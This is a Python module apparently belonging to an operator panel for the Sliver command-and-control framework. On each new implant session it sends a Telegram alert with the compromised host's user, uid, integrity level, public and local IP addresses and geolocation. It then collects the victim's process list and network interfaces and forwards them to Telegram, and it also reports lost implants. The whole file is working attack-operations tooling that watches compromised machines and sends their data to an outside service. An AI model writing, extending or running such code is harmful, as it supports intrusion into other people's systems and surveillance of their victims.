"""Event-driven Telegram alerts and post-connect telemetry.

Subscribes to the bridge event stream; on a new session fires exactly one alert
(EXTRA C2) and then, after a short delay, collects telemetry (EXTRA C3).
Never blocks the session list.
"""

from __future__ import annotations

import asyncio
import contextlib
import logging
import time

from .config import Settings
from .sliver import BridgeError, SliverBridge
from .tg import Telegram, escape

log = logging.getLogger("fleet.alerts")

TELEMETRY_DELAY = 10
BLOCK_LIMIT = 3500


class Alerts:
    def __init__(self, config: Settings, tg: Telegram, bridge: SliverBridge, database) -> None:
        self.config = config
        self.tg = tg
        self.bridge = bridge
        self.db = database
        self._seen: set[str] = set()
        self._task: asyncio.Task[None] | None = None
        self._tasks: set[asyncio.Task[None]] = set()
        self._geo_cache: dict[str, dict[str, str]] = {}

    def start(self) -> None:
        if self._task is None:
            self._task = asyncio.create_task(self._run())

    async def _run(self) -> None:
        from websockets.asyncio.client import connect

        url = self.config.bridge_url.replace("https://", "wss://").replace("http://", "ws://")
        backoff = 1.0
        while True:
            try:
                async with connect(f"{url}/sliver/events", open_timeout=10) as conn:
                    backoff = 1.0
                    async for raw in conn:
                        await self._handle(raw)
            except (TimeoutError, OSError) as exc:
                log.warning("event stream reconnecting: %s", exc)
                await asyncio.sleep(backoff)
                backoff = min(10.0, backoff * 2)

    async def _handle(self, raw: str | bytes) -> None:
        if isinstance(raw, bytes):
            raw = raw.decode()
        import json

        try:
            event = json.loads(raw)
        except ValueError:
            return
        kind = event.get("type", "")
        session = event.get("session") or {}
        if kind == "session-connected" and session.get("id"):
            if session["id"] in self._seen:
                return
            self._seen.add(session["id"])
            task = asyncio.create_task(self._enriched_alert(session))
            self._tasks.add(task)
            task.add_done_callback(self._tasks.discard)
            task2 = asyncio.create_task(self._telemetry(session["id"]))
            self._tasks.add(task2)
            task2.add_done_callback(self._tasks.discard)
        elif kind == "session-disconnected" and session.get("id"):
            self._seen.discard(session["id"])
            self.tg.send(
                f"\U0001f534 <b>IMPLANT LOST</b>\n{escape(session.get('host', '?'))}\n"
                f"<code>{session.get('id', '')}</code>"
            )

    # -- messages ------------------------------------------------------------
    def panel_start(self) -> None:
        self.tg.send(
            f"\U0001f7e2 <b>panel up</b>\noperator: {escape(self.config.panel_user)}\n"
            f"host: {escape(self.config.public_host)}"
        )

    def login_burst(self, count: int) -> None:
        self.tg.send(f"\U0001f7e1 <b>failed logins</b>\n{count} failures in 5 min")

    def _geo(self, ip: str) -> dict[str, str]:
        if not ip or ip.startswith("127."):
            return {}
        if ip in self._geo_cache:
            return self._geo_cache[ip]
        info: dict[str, str] = {}
        try:
            import httpx

            resp = httpx.get(
                f"http://ip-api.com/json/{ip}?fields=status,country,countryCode,regionName,city,isp,org,as,timezone",
                timeout=6.0,
            )
            data = resp.json()
            if data.get("status") == "success":
                info = {
                    k: str(data.get(k, ""))
                    for k in (
                        "country",
                        "countryCode",
                        "regionName",
                        "city",
                        "isp",
                        "org",
                        "as",
                        "timezone",
                    )
                }
        except Exception as exc:  # best effort, never blocks the alert
            log.debug("geo lookup failed for %s: %s", ip, exc)
        self._geo_cache[ip] = info
        return info

    async def _local_ips(self, session_id: str) -> list[str]:
        try:
            info = await asyncio.to_thread(self.bridge.info, session_id)
        except BridgeError:
            return []
        ips: list[str] = []
        for iface in info.get("interfaces") or []:
            ips.extend(iface.get("ips") or [])
        return [ip for ip in ips if ip and not ip.startswith("127.")]

    async def _enriched_alert(self, session: dict) -> None:
        remote = session.get("remote_address", "").split(":")[0]
        geo = await asyncio.to_thread(self._geo, remote)
        local_ips = await self._local_ips(session["id"])
        with contextlib.suppress(Exception):
            self.db_set_ip(session["id"], remote, ",".join(local_ips))

        where = remote
        if geo.get("country"):
            cc = geo.get("countryCode", "")
            where = f"{remote} ({cc} {geo.get('country')}, {geo.get('city', '')})"

        host = escape(session.get("host", "?"))
        user = escape(session.get("user", "?"))
        uid = f"{session.get('uid', '-')}:{session.get('gid', '-')}"
        osarch = f"{session.get('os', '?')} {session.get('arch', '?')}"
        lines = [
            "\U0001f7e2 <b>NEW IMPLANT</b>",
            f"<b>host</b> {host} | <b>user</b> {user} | <b>uid</b> {uid}",
            f"<b>os</b> {osarch} | <b>pid</b> {session.get('pid', '?')}",
            f"<b>integrity</b> {escape(session.get('integrity', '-'))}",
            f"<b>public ip</b> {escape(where)}",
            f"<b>local ips</b> {escape(', '.join(local_ips) or '-')}",
            f"<b>device</b> locale {escape(session.get('locale', '-'))}",
            f"<b>version</b> {escape(session.get('version', '-'))}",
        ]
        if geo.get("isp"):
            net = f"{geo.get('isp', '')} / {geo.get('as', '')}"
            lines.append(f"<b>network</b> {escape(net)}")
        lines.append(
            "<b>reconnect</b> <code>{i}</code> {t} c2={c} iv={v}s".format(
                i=escape(session.get("id", "")),
                t=escape(session.get("transport", "?")),
                c=escape(session.get("active_c2", "-")),
                v=session.get("reconnect_interval", "?"),
            )
        )
        first = session.get("first_contact", "?")
        last = session.get("last_checkin", "?")
        fname = escape(session.get("filename", "-"))
        lines.append(f"<b>core</b> first {first} | last {last} | {fname}")
        self.tg.send("\n".join(lines))

    def db_set_ip(self, session_id: str, public_ip: str, local_ips: str) -> None:
        with self.db.connect() as conn:
            conn.execute(
                "INSERT INTO implant_ip (session_id, public_ip, local_ips, updated) "
                "VALUES (?, ?, ?, ?) ON CONFLICT(session_id) DO UPDATE SET "
                "public_ip = excluded.public_ip, local_ips = excluded.local_ips, "
                "updated = excluded.updated",
                (session_id, public_ip, local_ips, time.time()),
            )

    async def _telemetry(self, session_id: str) -> None:
        await asyncio.sleep(TELEMETRY_DELAY)
        blocks: list[str] = []
        try:
            ps = await asyncio.to_thread(self.bridge.ps, session_id)
            lines = [
                f"{p['pid']} {p.get('owner', '')} {p.get('executable', '')}"
                for p in (ps.get("processes") or [])[:15]
            ]
            if lines:
                blocks.append("<b>ps (top 15)</b>\n<pre>" + escape("\n".join(lines)) + "</pre>")
        except BridgeError as exc:
            blocks.append(f"<b>ps</b> error {escape(str(exc))}")
        try:
            info = await asyncio.to_thread(self.bridge.info, session_id)
            ifaces = info.get("interfaces") or []
            lines = [f"{i.get('name')} {','.join(i.get('ips') or [])}" for i in ifaces]
            if lines:
                blocks.append("<b>interfaces</b>\n<pre>" + escape("\n".join(lines)) + "</pre>")
        except BridgeError as exc:
            blocks.append(f"<b>ifconfig</b> error {escape(str(exc))}")
        if not blocks:
            return
        joined = "\n".join(blocks)
        for chunk in _split(joined, BLOCK_LIMIT):
            self.tg.send(chunk, caption=f"telemetry {session_id[:8]}")

    def crash(self, reason: str) -> None:
        self.tg.send(f"\U0001f534 <b>panel crash</b>\n{escape(reason[:400])}")


def _split(text: str, limit: int) -> list[str]:
    if len(text) <= limit:
        return [text]
    out: list[str] = []
    current = ""
    for block in text.split("\n"):
        if len(current) + len(block) + 1 > limit:
            out.append(current)
            current = ""
        current += block + "\n"
    if current:
        out.append(current)
    return out


def login_burst_message() -> str:
    return time.strftime("%H:%M:%S")
